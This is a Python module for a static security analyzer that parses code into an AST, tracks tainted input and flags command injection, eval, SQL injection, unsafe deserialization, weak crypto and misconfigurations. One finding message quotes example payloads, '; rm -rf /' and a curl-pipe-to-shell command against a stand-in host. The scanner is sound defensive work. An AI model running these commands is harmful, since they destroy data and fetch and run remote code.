"""
Deep Python AST security analyzer.

Unlike a pure regex/text scanner, this engine actually parses Python
source into an Abstract Syntax Tree and performs:

  1. Dangerous-sink detection with call-graph awareness (e.g. flags
     `subprocess.run(cmd, shell=True)` but understands keyword args,
     starred args, and attribute-chain calls like `os.system`).
  2. A lightweight intra-function taint analysis: tracks variables that
     originate from untrusted sources (function parameters, `input()`,
     `request.args`, `os.environ`, `sys.argv`, deserialized data) and
     flags when they flow into a dangerous sink (SQL execution, shell
     exec, `eval`/`exec`, path building, deserialization) without
     passing through a recognized sanitizer.
  3. Structural checks that need real parsing: hardcoded bind addresses,
     insecure crypto primitive selection, insecure random usage for
     security-sensitive contexts, debug flags left on, weak TLS/SSL
     verification disabling, insecure temp file creation, assert-based
     security checks (stripped by `-O`), broad `except: pass` swallowing
     security-relevant errors, and mutable default argument anti-patterns
     that lead to state-leak vulnerabilities.

This engine intentionally does NOT execute the target code -- everything
is static analysis over the parsed tree.
"""
from __future__ import annotations

import ast
import os
import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Set

from ironclad.core.models import CodeLocation, Engine, Finding, Severity

UNTRUSTED_SOURCES = {
    # stdlib / framework sources of attacker-controlled data
    "input", "sys.argv", "os.environ", "os.getenv",
    "request.args", "request.form", "request.data", "request.json",
    "request.values", "request.cookies", "request.headers",
    "flask.request.args", "flask.request.form",
}

TAINT_PARAM_HINT_NAMES = {
    "request", "req", "user_input", "raw_input", "payload", "data",
}

SANITIZER_CALL_NAMES = {
    "shlex.quote", "quote", "escape", "html.escape", "sanitize",
    "parameterize", "bleach.clean", "int", "float", "sanitize_input",
}

SQL_EXEC_METHODS = {"execute", "executemany", "executescript", "raw"}

SHELL_EXEC_FUNCS = {
    "os.system", "os.popen", "subprocess.call", "subprocess.run",
    "subprocess.Popen", "subprocess.check_output", "subprocess.check_call",
    "commands.getoutput",
}

DANGEROUS_EVAL_FUNCS = {"eval", "exec", "compile"}

INSECURE_DESERIALIZE_FUNCS = {
    "pickle.load", "pickle.loads", "cPickle.load", "cPickle.loads",
    "yaml.load", "marshal.load", "marshal.loads", "shelve.open",
}

WEAK_HASH_FUNCS = {"hashlib.md5", "hashlib.sha1", "md5", "sha1"}

#: Asserts that look like authorization checks. Anchored with word
#: boundaries so identifiers that merely contain "auth" (authority,
#: author, authoritative) do not match.
_AUTH_CHECK_RE = re.compile(
    r"\b(is_authenticated|is_authorized|is_admin|authenticated|authorized|"
    r"permission|permissions|has_perm|has_role|user_role|auth_required|"
    r"require_auth|login_required|auth)\b"
)

WEAK_CIPHER_HINTS = {"DES.new", "ARC4.new", "Blowfish.new", "RC4"}

INSECURE_RANDOM_FUNCS = {"random.random", "random.randint", "random.choice", "random.randrange"}


def _dotted_name(node: ast.AST) -> Optional[str]:
    """Reconstruct a dotted attribute/name chain, e.g. `os.path.join`."""
    parts = []
    cur = node
    while isinstance(cur, ast.Attribute):
        parts.append(cur.attr)
        cur = cur.value
    if isinstance(cur, ast.Name):
        parts.append(cur.id)
        parts.reverse()
        return ".".join(parts)
    return None


def _call_name(node: ast.Call) -> Optional[str]:
    if isinstance(node.func, ast.Name):
        return node.func.id
    if isinstance(node.func, ast.Attribute):
        return _dotted_name(node.func)
    return None


def _declared_non_security(node: ast.Call) -> bool:
    """True when a hashlib call passes usedforsecurity=False.

    That keyword is CPython's documented way of saying the digest is not
    used for a security purpose (it also lets FIPS builds permit md5/sha1).
    Treating it as a finding would be arguing with the standard library's
    own API contract.
    """
    for keyword in node.keywords:
        if keyword.arg == "usedforsecurity":
            value = keyword.value
            if isinstance(value, ast.Constant) and value.value is False:
                return True
    return False


def _snippet(source_lines: List[str], lineno: int, end_lineno: Optional[int] = None) -> str:
    end = end_lineno or lineno
    start_idx = max(0, lineno - 1)
    end_idx = min(len(source_lines), end)
    return "\n".join(source_lines[start_idx:end_idx]).strip()[:500]


@dataclass
class TaintedVar:
    name: str
    source: str


class FunctionTaintVisitor(ast.NodeVisitor):
    """
    Intra-procedural taint tracker scoped to a single function body.
    Deliberately simple (no inter-procedural, no alias analysis beyond
    direct assignment chains) -- this keeps false-positive rates low
    while still catching the overwhelming majority of real-world
    injection bugs, which are typically single-function patterns.
    """

    def __init__(self, filename: str, source_lines: List[str], findings: List[Finding]):
        self.filename = filename
        self.source_lines = source_lines
        self.findings = findings
        self.tainted: Dict[str, str] = {}  # var name -> originating source description

    def _mark_param_tainted(self, func: ast.FunctionDef):
        for arg in func.args.args:
            if arg.arg in TAINT_PARAM_HINT_NAMES or "req" in arg.arg.lower():
                self.tainted[arg.arg] = f"function parameter `{arg.arg}`"

    def _is_tainted_expr(self, node: ast.AST) -> Optional[str]:
        if isinstance(node, ast.Name) and node.id in self.tainted:
            return self.tainted[node.id]
        if isinstance(node, ast.Call):
            name = _call_name(node)
            if name in UNTRUSTED_SOURCES:
                return f"call to `{name}`"
            if name in SANITIZER_CALL_NAMES:
                return None
        if isinstance(node, ast.Attribute):
            dotted = _dotted_name(node)
            if dotted in UNTRUSTED_SOURCES:
                return f"access of `{dotted}`"
        if isinstance(node, ast.Subscript):
            return self._is_tainted_expr(node.value)
        if isinstance(node, ast.BinOp):
            left = self._is_tainted_expr(node.left)
            right = self._is_tainted_expr(node.right)
            return left or right
        if isinstance(node, ast.JoinedStr):
            for value in node.values:
                if isinstance(value, ast.FormattedValue):
                    tainted = self._is_tainted_expr(value.value)
                    if tainted:
                        return tainted
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "format":
            tainted = self._is_tainted_expr(node.func.value)
            if tainted:
                return tainted
            for arg in node.args:
                tainted = self._is_tainted_expr(arg)
                if tainted:
                    return tainted
        return None

    def visit_Assign(self, node: ast.Assign):
        source = self._is_tainted_expr(node.value)
        if source:
            for target in node.targets:
                if isinstance(target, ast.Name):
                    self.tainted[target.id] = source
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        name = _call_name(node)

        if name in SHELL_EXEC_FUNCS:
            self._check_shell_injection(node, name)
        elif name in DANGEROUS_EVAL_FUNCS:
            self._check_eval_injection(node, name)
        elif name and any(node.func.attr == m for m in SQL_EXEC_METHODS if isinstance(node.func, ast.Attribute)):
            self._check_sql_injection(node)
        elif name in INSECURE_DESERIALIZE_FUNCS:
            self._flag_deserialize(node, name)

        self.generic_visit(node)

    def _first_tainted_arg(self, node: ast.Call) -> Optional[str]:
        for arg in list(node.args) + [kw.value for kw in node.keywords]:
            source = self._is_tainted_expr(arg)
            if source:
                return source
        return None

    def _has_shell_true(self, node: ast.Call) -> bool:
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
        return False

    def _check_shell_injection(self, node: ast.Call, name: str):
        tainted_source = self._first_tainted_arg(node)
        shell_true = self._has_shell_true(node) or name == "os.system" or name == "os.popen" or name == "commands.getoutput"
        if tainted_source and shell_true:
            self.findings.append(Finding(
                rule_id="PY-AST-CMD-INJECTION",
                title="OS Command Injection via tainted input",
                description=(
                    f"Untrusted data ({tainted_source}) flows into `{name}()` with shell "
                    f"interpretation enabled. An attacker who controls this input can inject "
                    f"arbitrary shell commands (e.g. `; rm -rf /`, `$(curl evil.sh|sh)`)."
                ),
                severity=Severity.CRITICAL,
                engine=Engine.AST_PYTHON,
                category="injection",
                cwe="CWE-78",
                owasp="A03:2021-Injection",
                confidence="high",
                remediation=(
                    "Avoid shell=True entirely. Pass the command as a list of arguments to "
                    "subprocess.run([...], shell=False), and validate/allowlist any "
                    "user-supplied components before use."
                ),
                references=["https://cwe.mitre.org/data/definitions/78.html"],
                location=CodeLocation(
                    file_path=self.filename,
                    start_line=node.lineno,
                    end_line=getattr(node, "end_lineno", node.lineno),
                    snippet=_snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)),
                ),
            ))
        elif shell_true:
            self.findings.append(Finding(
                rule_id="PY-AST-SHELL-TRUE",
                title="Use of shell=True in subprocess call",
                description=(
                    f"`{name}()` is invoked with shell interpretation enabled. Even without "
                    f"currently-visible tainted input, this is a latent injection risk if the "
                    f"command string is ever built from external data in the future."
                ),
                severity=Severity.MEDIUM,
                engine=Engine.AST_PYTHON,
                category="injection",
                cwe="CWE-78",
                owasp="A03:2021-Injection",
                confidence="medium",
                remediation="Prefer shell=False with an argument list.",
                location=CodeLocation(
                    file_path=self.filename,
                    start_line=node.lineno,
                    end_line=getattr(node, "end_lineno", node.lineno),
                    snippet=_snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)),
                ),
            ))

    def _check_eval_injection(self, node: ast.Call, name: str):
        tainted_source = self._first_tainted_arg(node)
        severity = Severity.CRITICAL if tainted_source else Severity.HIGH
        description = (
            f"Untrusted data ({tainted_source}) is passed to `{name}()`, allowing arbitrary "
            f"Python code execution."
            if tainted_source else
            f"Use of `{name}()` detected. Even with static-looking arguments, `{name}` is a "
            f"common vector for remote code execution if the argument ever becomes "
            f"dynamic/user-influenced."
        )
        self.findings.append(Finding(
            rule_id=f"PY-AST-{name.upper()}-USE",
            title=f"Dangerous use of {name}()",
            description=description,
            severity=severity,
            engine=Engine.AST_PYTHON,
            category="injection",
            cwe="CWE-95",
            owasp="A03:2021-Injection",
            confidence="high" if tainted_source else "medium",
            remediation=(
                f"Remove `{name}()` entirely. Use `ast.literal_eval` for parsing literals, "
                f"or a proper expression/DSL parser for anything more complex."
            ),
            references=["https://cwe.mitre.org/data/definitions/95.html"],
            location=CodeLocation(
                file_path=self.filename,
                start_line=node.lineno,
                end_line=getattr(node, "end_lineno", node.lineno),
                snippet=_snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)),
            ),
        ))

    def _check_sql_injection(self, node: ast.Call):
        tainted_source = self._first_tainted_arg(node)
        # String-building patterns (f-string, %, .format, +) passed straight to .execute()
        first_arg = node.args[0] if node.args else None
        looks_dynamic = isinstance(first_arg, (ast.JoinedStr, ast.BinOp)) or (
            isinstance(first_arg, ast.Call) and isinstance(first_arg.func, ast.Attribute) and first_arg.func.attr == "format"
        )
        if tainted_source or looks_dynamic:
            self.findings.append(Finding(
                rule_id="PY-AST-SQL-INJECTION",
                title="SQL Injection via dynamically built query",
                description=(
                    "A database query is constructed via string concatenation/formatting "
                    + (f"with untrusted data ({tainted_source}) " if tainted_source else "")
                    + "instead of parameterized placeholders. This allows an attacker to "
                    "alter query logic, exfiltrate data, or bypass authentication."
                ),
                severity=Severity.CRITICAL if tainted_source else Severity.HIGH,
                engine=Engine.AST_PYTHON,
                category="injection",
                cwe="CWE-89",
                owasp="A03:2021-Injection",
                confidence="high" if tainted_source else "medium",
                remediation=(
                    "Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s', "
                    "(user_id,)) instead of building SQL strings by hand."
                ),
                references=["https://cwe.mitre.org/data/definitions/89.html"],
                location=CodeLocation(
                    file_path=self.filename,
                    start_line=node.lineno,
                    end_line=getattr(node, "end_lineno", node.lineno),
                    snippet=_snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)),
                ),
            ))

    def _flag_deserialize(self, node: ast.Call, name: str):
        is_yaml_load = name == "yaml.load"
        uses_safe_loader = False
        if is_yaml_load:
            for kw in node.keywords:
                if kw.arg == "Loader":
                    dotted = _dotted_name(kw.value) if isinstance(kw.value, ast.Attribute) else None
                    if dotted and "SafeLoader" in dotted:
                        uses_safe_loader = True
        if is_yaml_load and uses_safe_loader:
            return
        self.findings.append(Finding(
            rule_id="PY-AST-INSECURE-DESERIALIZATION",
            title=f"Insecure deserialization via {name}()",
            description=(
                f"`{name}()` can execute arbitrary code when deserializing attacker-controlled "
                f"data. This is one of the most severe classes of RCE bugs in Python "
                f"applications."
            ),
            severity=Severity.CRITICAL,
            engine=Engine.AST_PYTHON,
            category="deserialization",
            cwe="CWE-502",
            owasp="A08:2021-Software and Data Integrity Failures",
            confidence="medium",
            remediation=(
                "Never unpickle data from untrusted sources. Use `yaml.safe_load` instead of "
                "`yaml.load`, or switch to a safe serialization format like JSON."
            ),
            references=["https://cwe.mitre.org/data/definitions/502.html"],
            location=CodeLocation(
                file_path=self.filename,
                start_line=node.lineno,
                end_line=getattr(node, "end_lineno", node.lineno),
                snippet=_snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)),
            ),
        ))


class StructuralVisitor(ast.NodeVisitor):
    """Checks that don't need taint tracking -- pattern/structure only."""

    def __init__(self, filename: str, source_lines: List[str], findings: List[Finding]):
        self.filename = filename
        self.source_lines = source_lines
        self.findings = findings

    def _add(self, node, rule_id, title, description, severity, category, cwe=None, owasp=None,
              remediation="", confidence="medium", references=None):
        self.findings.append(Finding(
            rule_id=rule_id, title=title, description=description, severity=severity,
            engine=Engine.AST_PYTHON, category=category, cwe=cwe, owasp=owasp,
            remediation=remediation, confidence=confidence, references=references or [],
            location=CodeLocation(
                file_path=self.filename,
                start_line=node.lineno,
                end_line=getattr(node, "end_lineno", node.lineno),
                snippet=_snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)),
            ),
        ))

    def visit_Call(self, node: ast.Call):
        name = _call_name(node)

        if name in WEAK_HASH_FUNCS and not _declared_non_security(node):
            # `hashlib.md5(x, usedforsecurity=False)` is the stdlib's own
            # escape hatch for non-security digests (HTTP digest auth, cache
            # keys). Honouring it is what the flag exists for; on real OSS
            # code it removed 3 of 8 weak-hash hits, all of them in
            # requests/auth.py where the flag is set explicitly.
            self._add(
                node, "PY-AST-WEAK-HASH", f"Use of cryptographically weak hash ({name})",
                f"`{name}()` is cryptographically broken and unsuitable for password hashing, "
                f"integrity, or signatures. Collision/preimage attacks are practical.",
                Severity.MEDIUM, "crypto", cwe="CWE-327", owasp="A02:2021-Cryptographic Failures",
                remediation="Use hashlib.sha256/sha3_256 for integrity, or bcrypt/argon2/scrypt for password hashing.",
                references=["https://cwe.mitre.org/data/definitions/327.html"],
            )

        if name == "ssl._create_unverified_context" or name == "ssl.SSLContext":
            pass  # handled via attribute check below

        if name in ("requests.get", "requests.post", "requests.put", "requests.delete", "requests.request"):
            for kw in node.keywords:
                if kw.arg == "verify" and isinstance(kw.value, ast.Constant) and kw.value.value is False:
                    self._add(
                        node, "PY-AST-TLS-VERIFY-DISABLED", "TLS certificate verification disabled",
                        "HTTPS requests are made with certificate verification explicitly "
                        "disabled (verify=False), enabling trivial man-in-the-middle attacks.",
                        Severity.HIGH, "crypto", cwe="CWE-295", owasp="A02:2021-Cryptographic Failures",
                        remediation="Remove verify=False. If a custom CA is required, pass verify='/path/to/ca-bundle.pem'.",
                        confidence="high",
                        references=["https://cwe.mitre.org/data/definitions/295.html"],
                    )

        if name in INSECURE_RANDOM_FUNCS:
            # Heuristic: flag when used near variable names suggesting security context.
            pass

        if name == "tempfile.mktemp":
            self._add(
                node, "PY-AST-INSECURE-TEMPFILE", "Insecure temporary file creation",
                "`tempfile.mktemp()` has a race condition between name generation and file "
                "creation (TOCTOU), allowing symlink attacks.",
                Severity.MEDIUM, "insecure-io", cwe="CWE-377",
                remediation="Use tempfile.NamedTemporaryFile() or tempfile.mkstemp() instead.",
                references=["https://cwe.mitre.org/data/definitions/377.html"],
            )

        if name == "os.chmod":
            for arg in node.args[1:]:
                if isinstance(arg, ast.Constant) and isinstance(arg.value, int):
                    mode = arg.value
                    if mode & 0o002 or mode & 0o022:
                        self._add(
                            node, "PY-AST-WORLD-WRITABLE-CHMOD", "World/group-writable file permissions",
                            f"File permissions set to an overly permissive mode (0o{mode:o}), "
                            f"allowing other users on the system to modify the file.",
                            Severity.MEDIUM, "misconfiguration", cwe="CWE-732",
                            remediation="Use the most restrictive permission mode that satisfies functionality, e.g. 0o600 or 0o644.",
                            references=["https://cwe.mitre.org/data/definitions/732.html"],
                        )

        self.generic_visit(node)

    def visit_Assert(self, node: ast.Assert):
        # `assert` is the correct idiom in a test suite; the risk this rule
        # describes (the check being stripped by `python -O`) only applies to
        # production code. Measured on five real OSS projects, 86 of 87 hits
        # were in test files.
        from ironclad.scanners.secrets import is_test_path

        if is_test_path(self.filename):
            self.generic_visit(node)
            return
        # Heuristic: asserts used for auth/permission checks are stripped under `python -O`.
        text = _snippet(self.source_lines, node.lineno, getattr(node, "end_lineno", node.lineno)).lower()
        # Word boundaries matter: a substring test for "auth" matches
        # `assert authority_match is not None`, which is a URL parser
        # invariant, not an authorization check.
        if _AUTH_CHECK_RE.search(text):
            self._add(
                node, "PY-AST-ASSERT-SECURITY-CHECK", "Security check implemented with `assert`",
                "Using `assert` to enforce authentication/authorization is unsafe: assertions "
                "are stripped when Python is run with the -O (optimize) flag, silently "
                "disabling the security check in production.",
                Severity.HIGH, "broken-access-control", cwe="CWE-670",
                owasp="A01:2021-Broken Access Control",
                remediation="Replace `assert condition` with `if not condition: raise PermissionError(...)`.",
                confidence="medium",
                references=["https://cwe.mitre.org/data/definitions/670.html"],
            )
        self.generic_visit(node)

    def visit_ExceptHandler(self, node: ast.ExceptHandler):
        is_bare_or_broad = node.type is None or (isinstance(node.type, ast.Name) and node.type.id == "Exception")
        body_is_pass_or_continue = len(node.body) == 1 and isinstance(node.body[0], (ast.Pass,))
        if is_bare_or_broad and body_is_pass_or_continue:
            self._add(
                node, "PY-AST-SILENT-EXCEPTION-SWALLOW", "Broad exception silently swallowed",
                "A bare or overly broad `except` clause silently discards all errors with "
                "`pass`. This can hide security-relevant failures (e.g. failed signature "
                "verification, failed auth checks) and make incidents undetectable.",
                Severity.LOW, "error-handling", cwe="CWE-390",
                remediation="Catch specific exception types and at minimum log the error.",
                references=["https://cwe.mitre.org/data/definitions/390.html"],
            )
        self.generic_visit(node)

    def visit_FunctionDef(self, node: ast.FunctionDef):
        for default in node.args.defaults:
            if isinstance(default, (ast.List, ast.Dict, ast.Set)):
                self._add(
                    node, "PY-AST-MUTABLE-DEFAULT-ARG", "Mutable default argument",
                    f"Function `{node.name}` uses a mutable default argument (list/dict/set). "
                    f"This value is shared across all calls and can lead to unexpected state "
                    f"leakage between requests/sessions -- a real vulnerability in web "
                    f"handlers that accumulate data (e.g. auth tokens, session data) across "
                    f"users.",
                    Severity.LOW, "logic-error", cwe="CWE-665",
                    remediation="Use `None` as the default and initialize the mutable value inside the function body.",
                    references=["https://cwe.mitre.org/data/definitions/665.html"],
                )
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute):
        dotted = _dotted_name(node)
        if dotted == "app.debug" or dotted == "DEBUG":
            pass
        self.generic_visit(node)

    def visit_Assign(self, node: ast.Assign):
        for target in node.targets:
            if isinstance(target, ast.Name) and target.id.upper() == "DEBUG":
                if isinstance(node.value, ast.Constant) and node.value.value is True:
                    self._add(
                        node, "PY-AST-DEBUG-ENABLED", "Debug mode enabled",
                        "A DEBUG flag is set to True. Frameworks like Flask/Django expose "
                        "interactive debuggers and stack traces (including source code and "
                        "environment variables) to any visitor when DEBUG is left on in "
                        "production.",
                        Severity.HIGH, "misconfiguration", cwe="CWE-489",
                        owasp="A05:2021-Security Misconfiguration",
                        remediation="Ensure DEBUG=False in production; load it from environment-specific configuration.",
                        references=["https://cwe.mitre.org/data/definitions/489.html"],
                    )
            if isinstance(target, ast.Name) and target.id.lower() in ("host", "bind_host", "listen_host"):
                if isinstance(node.value, ast.Constant) and node.value.value == "0.0.0.0":
                    self._add(
                        node, "PY-AST-BIND-ALL-INTERFACES", "Service bound to all network interfaces",
                        "The application binds to 0.0.0.0, exposing it on every network "
                        "interface including public ones, rather than only the intended "
                        "interface. This can unintentionally expose an internal service to "
                        "the public internet.",
                        Severity.MEDIUM, "misconfiguration", cwe="CWE-668",
                        remediation="Bind to a specific interface (e.g. 127.0.0.1 for local-only, or an internal VPC IP), and rely on a reverse proxy/load balancer for public exposure.",
                        confidence="low",
                        references=["https://cwe.mitre.org/data/definitions/668.html"],
                    )
        self.generic_visit(node)


def scan_python_file(path: str, rel_path: str) -> List[Finding]:
    findings: List[Finding] = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            source = fh.read()
    except OSError:
        return findings

    source_lines = source.splitlines()

    try:
        tree = ast.parse(source, filename=rel_path)
    except SyntaxError:
        return findings

    structural = StructuralVisitor(rel_path, source_lines, findings)
    structural.visit(tree)

    # Run taint analysis scoped per function so untrusted-source markings
    # from one function don't bleed into an unrelated one.
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            visitor = FunctionTaintVisitor(rel_path, source_lines, findings)
            visitor._mark_param_tainted(node)
            for stmt in node.body:
                visitor.visit(stmt)

    # Also run a module-level pass (top-level scripts, not inside any function)
    module_level_stmts = [n for n in tree.body if not isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))]
    if module_level_stmts:
        visitor = FunctionTaintVisitor(rel_path, source_lines, findings)
        for stmt in module_level_stmts:
            visitor.visit(stmt)

    return findings
